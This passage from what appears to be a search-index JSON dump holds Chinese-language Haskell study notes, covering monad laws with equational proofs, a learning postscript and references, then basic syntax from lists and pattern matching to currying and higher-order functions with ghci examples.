[ f a | a <- xs ] \\(\\mathrm{unit}_S(x) = \\\\{x\\\\}\\) return x = [x] \\(\\mathrm{join}_S(L) = \\bigcup L\\) join xs = concat xs \u5355\u5b50\u516c\u7406 \u00b6 \u7ed9\u5b9a\u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \uff08\u5176\u4e2d \\(A,B\\in \\mathbf{C}\\) \uff09\uff0c\u90a3\u4e48\u6ee1\u8db3\u4e0b\u9762\u56db\u6761\u5b9a\u5f8b\uff1a \\(\\mathrm{join}\\circ M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}\\) \\(\\mathrm{join}\\circ M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}\\) \\(\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}\\) \\(\\mathrm{join}\\circ M(M(f)) = M(f)\\circ\\mathrm{join}\\) \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u5c06\u5176\u8f6c\u5316\u4e3a Haskell \u4e2d\u7684\u8868\u8ff0\uff1a join . fmap join = join . join join . fmap return = join . return = id return . f = fmap f . return join . fmap (fmap f) = fmap f . join \u5728 Haskell \u4e2d\uff0c\u4f7f\u7528 >>= \u4e5f\u6709\u4e09\u4e2a\u5b9a\u5f8b\u548c\u8fd9\u56db\u4e2a\u5b9a\u5f8b\u662f\u7b49\u4ef7\u7684\uff1a return x >>= f = f x return x >>= f = join ( fmap f ( return x )) = join ( fmap f . return $ x ) = join ( return ( f x )) = join ( return . f $ x ) = join . return $ ( f x ) = id ( f x ) = f x m >>= return = m m >>= return = join ( fmap return m ) = join . fmap return $ m = id m = m (m >>= f) >>= g = m >>= (\\x -> f x >>= g) ( m >>= f ) >>= g = ( join ( fmap f m )) >>= g = join ( fmap g ( join ( fmap f m ))) = join . fmap g . join $ fmap f m = join . join . fmap ( fmap g ) $ fmap f m = join . join . fmap ( fmap g ) . fmap f $ m = join . join . fmap ( fmap g . f ) $ m = join . fmap join . fmap ( fmap g . f ) $ m = join . fmap ( join . ( fmap g . f )) $ m = join . fmap ( \\ x -> join ( fmap g ( f x ))) $ m = join . fmap ( \\ x -> f x >>= g ) $ m = join ( fmap ( \\ x -> f x >>= g ) m ) = m >>= ( \\ x -> f x >>= g ) \u6709\u5173 do \u8bed\u53e5\u548c >=> \u7684\u516c\u7406\u8868\u8ff0\u5728\u4e0a\u6587\u4e2d\u5df2\u7ecf\u8bf4\u8fc7 \u540e\u8bb0 \u00b6 \u5543\u4e86\u5c06\u8fd1\u4e00\u4e2a\u6708\uff0c\u7b97\u662f\u628a Haskell \u7684\u4e3b\u8981\u5185\u5bb9\u90fd\u5543\u5b8c\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u524d\u671f\u770b Learn You a Haskell \uff0c\u540e\u671f\u770b Typeclassopedia \uff0c\u90fd\u662f pdcxs \u63a8\u8350\u7ed9\u7684\u6559\u7a0b\u3002\u4f46\u662f\u4e00\u5806\u89c6\u9891\u4e00\u4e2a\u90fd\u6ca1\u6709\u8010\u5fc3\u770b\u8fdb\u53bbqwq \u540e\u9762\u7684\u90e8\u5206\u7684\u7406\u89e3\u611f\u89c9\u4e5f\u6ca1\u5230\u4f4d\uff0cCategory\u3001Arrow \u7b49\u8fd9\u4e9b\u7c7b\u578b\u7c7b\u4e5f\u5c31\u662f\u5927\u81f4\u5730\u770b\u4e86\u4e00\u773c\uff0c\u751a\u81f3\u6709\u4ec0\u4e48\u7528\u90fd\u4e0d\u592a\u6e05\u695a_(:\u0437\u300d\u2220)_ \u611f\u89c9 Haskell \u8fd9\u95e8\u8bed\u8a00\u786e\u5b9e\u5f88\u795e\u5947\uff0c\u5f88\u591a\u8bed\u6cd5\u90fd\u5f88\u6709\u610f\u601d\uff0c\u800c\u4e14\u53ef\u4ee5\u505a\u5230\u975e\u5e38\u8d34\u8fd1\u6570\u5b66\u3001\u8d34\u8fd1\u6570\u5b66\u6982\u5ff5\u3002\u5b66\u7684\u65f6\u5019\u4e5f\u662f\u8d8a\u5b66\u5751\u8d8a\u591a\uff0c\u5148\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u5f15\u7533\u5230\u4e86 lambda \u6f14\u7b97\uff0c\u7136\u540e\u662f\u51fd\u5b50\u7b49\u4e00\u7cfb\u5217\u6982\u5ff5\u5f15\u7533\u5230\u4e86\u8303\u7574\u8bba\uff0c\u76ee\u524d\u8303\u7574\u8bba\u7b80\u5355\u5730\u770b\u4e86\u4e00\u90e8\u5206\uff0clambda \u6f14\u7b97\u4e5f\u6ca1\u6df1\u5165\u7814\u7a76\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u8bf4\u4e86\uff08\u5495\u5495\u5495\uff09 \u73b0\u5728\u611f\u89c9\u6211\u5b66\u5230\u7684 Haskell \u7b80\u76f4\u662f\u76ae\u6bdb\uff0c\u8fd8\u6709\u4e00\u5806\u6e90\u7801\u91cc\u7684\u4e1c\u897f\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e#\uff0c~\uff09\uff0c\u4e5f\u8fd8\u6709\u4e00\u5806\u7c7b\u578b\u7c7b\u548c\u7528\u6cd5\u6ca1\u6709\u5b66\u5230\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e Monad Transformer\u3001Writer\u3001Reader\u3001State\u3001Comonad\u3001MonadFix\u3001Lens\u3001Parsec\u3001\u2026\u2026\uff09 md\uff0c\u8fd9\u4e48\u4e00\u770b\u5dee\u7684\u8fd8\u771f\u591a \uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u6162\u6162\u5b66\u4e86\uff0c\u8fd9\u4e2a\u5047\u671f\u8fd8\u6709\u597d\u591a\u5176\u5b83\u4e8b\u8981\u5e72\u5462\uff0cHaskell \u8fd9\u8fb9\u5148\u6478\u4e86_(:\u0437\u300d\u2220)_ Reference \u00b6 Learn You a Haskell Writing foldl using foldr - StackOverflow Haskell\uff1a\u7528foldr\u5b9a\u4e49foldl Typeclassopedia - Haskell wiki Hoogle Functors, Applicatives, And Monads In Pictures Haskell\u5b66\u4e60 - functor Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff088\uff09Monoid - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0816\uff09Alternative - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0840\uff09Arrow\uff081\uff09 - zwvista 24 Days of GHC Extensions: Arrows - Tom Ellis Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0847\uff09Arrow\uff082\uff09 - zwvista Haskell/Category theory - wikibooks Category theory - wikipedia \u8303\u7574\u8bba - \u7ef4\u57fa\u767e\u79d1 Monad (category theory) - wikipedia Functor - wikipedia \"The End?\"","title":"Haskell"},{"location":"cs/pl/haskell/#_1","text":"+ - * / () \uff1a\u52a0\u51cf\u4e58\u9664 div \uff1a\u6574\u9664 mod \uff1a\u53d6\u6a21 True False \uff1a\u5e03\u5c14\u503c || && not \uff1a\u6216\u4e14\u975e == \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u76f8\u7b49 /= \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u4e0d\u7b49","title":"\u57fa\u7840\u8fd0\u7b97"},{"location":"cs/pl/haskell/#_2","text":"Haskell \u4e2d\u8c03\u7528\u51fd\u6570\u4e0d\u52a0\u62ec\u53f7\uff0c\u5148\u5199\u51fa\u51fd\u6570\u540d\uff0c\u7136\u540e\u9010\u4e2a\u5217\u51fa\u53c2\u6570\uff0c\u7528\u7a7a\u683c\u9694\u5f00\uff1a ghci > max 1 2 2 \u524d\u7f00\uff08prefix\uff09\u51fd\u6570\u4e0e\u4e2d\u7f00\uff08infix\uff09\u51fd\u6570\u8f6c\u6362\uff1a \u5bf9\u524d\u7f00\u51fd\u6570\u52a0 `` \u4f7f\u5176\u53d8\u6210\u4e2d\u7f00\u51fd\u6570 \u5bf9\u4e2d\u7f00\u51fd\u6570\u52a0 () \u4f7f\u5176\u53d8\u6210\u524d\u7f00\u51fd\u6570 ghci > 4 ` div ` 2 2 ghci > 1 ` max ` 2 2 ghci > ( + ) 1 2 3 ghci > ( || ) True False True","title":"\u51fd\u6570\u8c03\u7528"},{"location":"cs/pl/haskell/#list","text":"\u5217\u8868\u662f Haskell \u4e2d\u5f88\u5e38\u89c1\u7684\u6570\u636e\u7c7b\u578b\uff0c\u548c Python \u4e2d\u4e0d\u540c\uff0cHaskell \u4e2d\u7684\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u4e2a\u7c7b\u578b\u3002 \u4ee5\u4e0b\u662f\u5217\u8868\u5e38\u7528\u7684\u51fd\u6570\uff1a (++) :: [a] -> [a] -> [a]\uff1a\u5408\u5e76\u4e24\u4e2a\u5217\u8868 (:) :: a -> [a] -> [a]\uff1a\u5c06\u5355\u4e2a\u5143\u7d20\u5e76\u5165\u5217\u8868\u3002[1, 2, 3] \u662f 1:2:3:[] \u7684\u8bed\u6cd5\u7cd6 (!!) :: [a] -> Int -> a\uff1a\u901a\u8fc7\u7d22\u5f15\u53d6\u51fa\u67d0\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\u3002a !! 1 \u76f8\u5f53\u4e8e Python \u4e2d\u7684 a[1] head :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 tail :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u7b2c\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868\uff08\u82e5\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u5219\u8fd4\u56de\u7a7a\u5217\u8868[]\uff09 last :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 init :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868 length :: Foldable t => t a -> Int\uff1a\u8fd4\u56de\u5217\u8868\u7684\u957f\u5ea6 null :: Foldable t => t a -> Bool\uff1a\u8fd4\u56de\u5217\u8868\u662f\u5426\u4e3a\u7a7a reverse :: [a] -> [a]\uff1a\u8fd4\u56de\u7ffb\u8f6c\u540e\u7684\u5217\u8868 take :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u7684\u524dn\u4e2a\u5143\u7d20\u7684\u5217\u8868(take n a) drop :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u4e2d\u9664\u53bb\u524dn\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868(drop n a) maximum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c minimum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c sum :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u548c product :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u79ef elem :: (Foldable t, Eq a) => t a -> Bool\uff1a\u5224\u65ad\u503cn\u662f\u5426\u5728\u5217\u8868a\u4e2d elem n a -- \u6216 n ` elem ` a --\u7528``\u5305\u4e0a\u53ef\u4ee5\u53d8\u6210\u4e2d\u7f00\u51fd\u6570\u4f7f\u7528","title":"List"},{"location":"cs/pl/haskell/#texas-ranges","text":"\u4f7f\u7528 .. \u53ef\u4ee5\u8868\u793a\u51fa\u8303\u56f4\u5e76\u81ea\u52a8\u63a8\u5bfc\uff1a ghci > [ 1 .. 10 ] [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] ghci > [ 'a' .. 'z' ] \"abcdefghijklmnopqrstuvwxyz\" ghci > [ 'K' .. 'Z' ] \"KLMNOPQRSTUVWXYZ\" ghci > [ 2 , 4 .. 20 ] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ 3 , 6 .. 20 ] [ 3 , 6 , 9 , 12 , 15 , 18 ] ghci > [ 5 , 4 .. 1 ] [ 5 , 4 , 3 , 2 , 1 ] \u4e5f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65e0\u7a77\u5217\u8868\uff0c\u5982 [1..]\u3001[1, 3..]\u3002\u540c\u65f6\u4e5f\u6709\u51fd\u6570\u53ef\u4ee5\u751f\u6210\u65e0\u7a77\u5217\u8868\uff1a cycle :: [a] -> [a]\uff1a\u5c06\u539f\u5217\u8868\u4e0d\u65ad\u5faa\u73af\u751f\u6210\u65e0\u7a77\u5217\u8868 repeat :: a -> [a]\uff1a\u5c06\u4f20\u5165\u7684\u503c\u4e0d\u65ad\u91cd\u590d\u751f\u6210\u65e0\u7a77\u5217\u8868 replicate :: Int -> a -> [a]\uff1a\u5c06\u503ca\u91cd\u590dn\u6b21\uff0c\u8fd4\u56de\u751f\u6210\u7684\u5217\u8868(replicate n a)","title":"Texas ranges"},{"location":"cs/pl/haskell/#list-comprehension","text":"Haskell \u4e2d\u4e5f\u6709\u5217\u8868\u63a8\u5bfc\uff0c\u5f62\u5f0f\u662f\u4e00\u4e2a\u4e2d\u62ec\u53f7\uff0c\u5de6\u4fa7\u4e3a\u8868\u8fbe\u5f0f\uff0c\u53f3\u4fa7\u4e3a\u53d8\u91cf\u7684\u8303\u56f4\u548c\u7ea6\u675f\u6761\u4ef6 ghci > [ x * 2 | x <- [ 1 .. 10 ]] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ x * 2 | x <- [ 1 .. 10 ], x * 2 >= 12 ] [ 12 , 14 , 16 , 18 , 20 ] ghci > [ x | x <- [ 50 .. 100 ], x ` mod ` 7 == 3 ] [ 52 , 59 , 66 , 73 , 80 , 87 , 94 ] ghci > [ x * y | x <- [ 2 , 5 , 10 ], y <- [ 8 , 10 , 11 ]] [ 16 , 20 , 22 , 40 , 50 , 55 , 80 , 100 , 110 ]","title":"List comprehension"},{"location":"cs/pl/haskell/#tuple","text":"Haskell\u4e2d\u7684\u5143\u7ec4\u53ef\u4ee5\u6709\u4e0d\u540c\u957f\u5ea6\uff0c\u5143\u7d20\u53ef\u4ee5\u6709\u4e0d\u540c\u7c7b\u578b\u3002\u5e76\u4e14\u4e00\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u6240\u6709\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\u3002\u5b83\u7684\u5e38\u7528\u51fd\u6570\uff1a fst :: (a, b) -> a\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 snd :: (a, b) -> b\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 zip :: [a] -> [b] -> [(a, b)]\uff1a\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u662f\u4f9d\u6b21\u5c06\u4e24\u4e2a\u5217\u8868\u4e2d\u5143\u7d20\u914d\u5bf9\u6210\u7684\u4e8c\u5143\u7ec4","title":"Tuple"},{"location":"cs/pl/haskell/#syntax-in-functions","text":"\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\uff1a plus x y = x + y \u8fd9\u65f6Haskell\u4f1a\u81ea\u52a8\u63a8\u65ad\u51fd\u6570\u7684\u7c7b\u578b\u4e3a(Num a) => a -> a -> a\u3002\u4f46\u662f\u6700\u597d\u5728\u5b9a\u4e49\u51fd\u6570\u524d\u58f0\u660e\u51fd\u6570\u7684\u7c7b\u578b\uff1a plus :: ( Num a ) => a -> a -> a plus x y = x + y","title":"Syntax in Functions"},{"location":"cs/pl/haskell/#pattern-matching","text":"\u5b9a\u4e49\u51fd\u6570\u65f6\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u8bed\u6cd5\u3002\u8fd0\u884c\u65f6\u4f9d\u6b21\u5c06\u8f93\u5165\u4e0e\u7ed9\u51fa\u7684\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u64cd\u4f5c\uff1b\u4e0d\u5339\u914d\uff0c\u5c31\u7ee7\u7eed\u4e0e\u4e0b\u4e00\u4e2a\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u76f4\u5230\u5339\u914d\u6210\u529f\uff0c\u4e5f\u56e0\u6b64\uff0c\u6700\u540e\u5fc5\u987b\u8981\u7ed9\u51fa\u4e00\u79cd\u901a\u7528\u7684\u5339\u914d\u6765\u63a5\u6536\u4e0e\u7ed9\u51fa\u6a21\u5f0f\u5168\u4e0d\u5339\u914d\u7684\u8f93\u5165\u3002\u5982\uff1a factorial :: ( Integral a ) => a -> a factorial 0 = 1 factorial n = n * factorial ( n - 1 ) first :: ( a , b , c ) -> a first ( x , _ , _ ) = x second :: ( a , b , c ) -> b second ( _ , y , _ ) = y third :: ( a , b , c ) -> c third ( _ , _ , z ) = z \u5176\u4e2d _ \u8868\u793a\u4efb\u4f55\u503c\uff0c\u4e14\u4e0d\u5173\u5fc3\u5b83\u7684\u5185\u5bb9\uff0c\u53ea\u662f\u7528\u6765\u5360\u4f4d \u5217\u8868\u7684 (:) \u64cd\u4f5c\u4e5f\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\uff1a head' :: [ a ] -> a head' [] = error \"Can't call head on an empty list, dummy!\" head' ( x : _ ) = x sum' :: ( Num a ) => [ a ] -> a sum' [] = 0 sum' ( x : xs ) = x + sum' xs \u4f46 (++) \u64cd\u4f5c\u4e0d\u53ef\u4ee5\u7528\u6765\u6a21\u5f0f\u5339\u914d \u5728\u9488\u5bf9\u5217\u8868\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u65f6\uff0c\u5982\u679c\u540c\u65f6\u9700\u8981\u6574\u4e2a\u5217\u8868\u3001\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u503c\u3001\u5217\u8868\u9664\u7b2c\u4e00\u4e2a\u503c\u5916\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 xs@(q:qs) \u3002\u6bd4\u5982 [1, 2, 3] \u901a\u8fc7 xs@(q:qs) \u5339\u914d\u540e\uff0cxs \u4e3a [1, 2, 3]\uff0cq \u4e3a 1\uff0cqs \u4e3a [2, 3]","title":"Pattern matching"},{"location":"cs/pl/haskell/#guard-syntax","text":"\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\uff1a max' :: ( Ord a ) => a -> a -> a max' a b | a > b = a | otherwise = b \u5148\u7ed9\u51fa\u4f20\u5165\u7684\u53c2\u6570\u53d8\u91cf\uff0c\u7136\u540e\u4e0b\u4e00\u884c\u7f29\u8fdb\u540e\u52a0 |\uff0c| \u540e\u9762\u7b49\u53f7\u524d\u8868\u793a\u8fdb\u884c\u7684\u5224\u65ad\uff0c\u5982\u679c\u4e3a True \u5219\u8fd4\u56de\u8fd9\u4e2a\u7b49\u53f7\u540e\u9762\u7684\u503c\uff1b\u5982\u679c\u4e3a False \u5219\u7ee7\u7eed\u5224\u65ad\u4e0b\u4e00\u884c\uff0c\u76f4\u5230 otherwise","title":"Guard syntax"},{"location":"cs/pl/haskell/#case-expressions","text":"\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 case \u8868\u8fbe\u5f0f\u6765\u914d\u5408\u6a21\u5f0f\u5339\u914d\u4f7f\u7528\uff1a case expression of pattern -> result pattern -> result ... \u4f8b\u5982\uff1a head' :: [ a ] -> a head' [] = error \"No head for empty lists!\" head' ( x : _ ) = x -- \u7b49\u4ef7\u4e8e\uff1a head' :: [ a ] -> a head' xs = case xs of [] -> error \"No head for empty lists!\" ( x : _ ) -> x describeList :: [ a ] -> String describeList xs = \"The list is \" ++ case xs of [] -> \"empty.\" [ x ] -> \"a singleton list.\" xs -> \"a longer list.\" -- \u7b49\u4ef7\u4e8e\uff1a describeList :: [ a ] -> String describeList xs = \"The list is \" ++ what xs where what [] = \"empty.\" what [ x ] = \"a singleton list.\" what xs = \"a longer list.\"","title":"Case expressions"},{"location":"cs/pl/haskell/#where","text":"\u58f0\u660e\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u8981\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 where \u5173\u952e\u5b57\uff1a initials :: String -> String -> String initials firstname lastname = [ f ] ++ \". \" ++ [ l ] ++ \".\" where ( f : _ ) = firstname ( l : _ ) = lastname \u5728 where \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684\u6a21\u5f0f\u5339\u914d","title":"where"},{"location":"cs/pl/haskell/#let","text":"let <bindings> in <expression> \u8bed\u6cd5\u53ef\u4ee5\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u666e\u901a\u7b97\u5f0f\u6216\u5217\u8868\u4e2d\u4f7f\u7528\uff1a cylinder :: ( RealFloat a ) => a -> a -> a cylinder r h = let sideArea = 2 * pi * r * h topArea = pi * r ^ 2 in sideArea + 2 * topArea ghci > 4 * ( let a = 9 in a + 1 ) + 2 42 ghci > [ let square x = x * x in ( square 5 , square 3 , square 2 )] [( 25 , 9 , 4 )]","title":"let"},{"location":"cs/pl/haskell/#if-statement","text":"Haskell \u4e2d\u7684 if \u8bed\u53e5\u4e3a\uff1a if ... then ... else ... -- or if ... then ... else ... -- or if ... then ... else if ... then ... else ... \u5176\u4e2d\u6700\u540e\u4e00\u4e2a else \u65e0\u8bba\u5982\u4f55\u4e5f\u4e0d\u53ef\u4ee5\u7701\u53bb","title":"if statement"},{"location":"cs/pl/haskell/#higher-order-functions","text":"","title":"Higher Order Functions"},{"location":"cs/pl/haskell/#currying","text":"Haskell \u4e2d\u7684\u51fd\u6570\u662f\u67ef\u91cc\u5316\uff08Currying\uff09\u7684\uff0c\u53ef\u4ee5\u770b\u4f5c\u6240\u6709\u51fd\u6570\u90fd\u53ea\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u6700\u7ec8\u7684\u7ed3\u679c\u3002\u6bd4\u5982 max \u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max :: Ord a => a -> a -> a \u53ef\u4ee5\u770b\u6210 a -> (a -> a)\uff0c\u5373\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> a \u7684\u51fd\u6570\u3002\u6bd4\u5982 max 1 \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max 1 :: (Ord a, Num a) => a -> a \u56e0\u6b64 max 1 2\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e (max 1) 2\uff0c\u5373\u5c06\u51fd\u6570 max 1 \u5e94\u7528\u5728\u6570\u5b572\u4e0a \u540c\u65f6\uff0c\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u53c2\u6570\u6709\u51fd\u6570\u7684\u51fd\u6570\u5c31\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570\uff08Higher Order Functions\uff09","title":"Currying"},{"location":"cs/pl/haskell/#_3","text":"","title":"\u4e00\u4e9b\u9ad8\u9636\u51fd\u6570"},{"location":"cs/pl/haskell/#zipwith","text":"zipWith :: (a -> b -> c) -> [a] -> [b] -> [c] \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u5c06\u5176\u5bf9\u5e94\u5143\u7d20\u4f20\u5165\u63a5\u6536\u7684\u51fd\u6570\u4e2d\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u7684\u5217\u8868\u3002\u5982\u679c\u4e24\u4e2a\u4f20\u5165\u7684\u5217\u8868\u957f\u5ea6\u4e0d\u540c\uff0c\u4ee5\u6700\u77ed\u7684\u5217\u8868\u4e3a\u51c6\uff0c\u957f\u5217\u8868\u4e2d\u8d85\u51fa\u7684\u5143\u7d20\u7701\u7565\u3002\u7528\u4f8b\uff1a ghci > zipWith ( + ) [ 4 , 2 , 5 , 6 ] [ 2 , 6 , 2 , 3 ] [ 6 , 8 , 7 , 9 ] ghci > zipWith max [ 6 , 3 , 2 , 1 ] [ 7 , 3 , 1 , 5 ] [ 7 , 3 , 2 , 5 ]","title":"zipWith"},{"location":"cs/pl/haskell/#flip","text":"flip :: (a -> b -> c) -> b -> a -> c flip \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4e8c\u5143\u51fd\u6570\uff0c\u5c06\u5176\u8f93\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u987a\u5e8f\u53cd\u8fc7\u6765\uff1a ghci > zip [ 1 , 2 , 3 , 4 , 5 ] \"hello\" [( 1 , 'h' ),( 2 , 'e' ),( 3 , 'l' ),( 4 , 'l' ),( 5 , 'o' )] ghci > flip zip [ 1 , 2 , 3 , 4 , 5 ] \"hello\" [( 'h' , 1 ),( 'e' , 2 ),( 'l' , 3 ),( 'l' , 4 ),( 'o' , 5 )]","title":"flip"},{"location":"cs/pl/haskell/#map","text":"map :: (a -> b) -> [a] -> [b] map \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u5217\u8868 a \u7684\u6bcf\u4e2a\u5143\u7d20\u4e2d\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7ec4\u6210\u7684\u5217\u8868 b\uff1a ghci > map ( + 3 ) [ 1 , 5 , 3 , 1 , 6 ] [ 4 , 8 , 6 , 4 , 9 ]","title":"map"},{"location":"cs/pl/haskell/#filter","text":"filter :: (a -> Bool) -> [a] -> [a] filter \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f \u4e2d\uff0c\u5982\u679c\u7ed3\u679c\u4e3a True \u5c31\u4fdd\u7559\uff0c\u7ed3\u679c\u4e3a False \u5c31\u629b\u5f03\uff0c\u8fd4\u56de\u6240\u6709\u4fdd\u7559\u7684\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a ghci > filter even [ 1 .. 10 ] [ 2 , 4 , 6 , 8 , 10 ]","title":"filter"},{"location":"cs/pl/haskell/#takewhile","text":"takeWhile :: (a -> Bool) -> [a] -> [a] takeWhile \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u4ece\u5de6\u5411\u53f3\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f\uff0c\u76f4\u5230\u7ed3\u679c\u4e3a False \u505c\u6b62\uff0c\u8fd4\u56de\u505c\u6b62\u524d\u4f20\u5165\u7684\u6240\u6709\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a ghci > takeWhile ( /= ' ' ) \"word1 word2\" \"word1\"","title":"takeWhile"},{"location":"cs/pl/haskell/#function-application","text":"\u51fd\u6570\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528 $ \uff0c $ \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a ($) :: (a -> b) -> a -> b 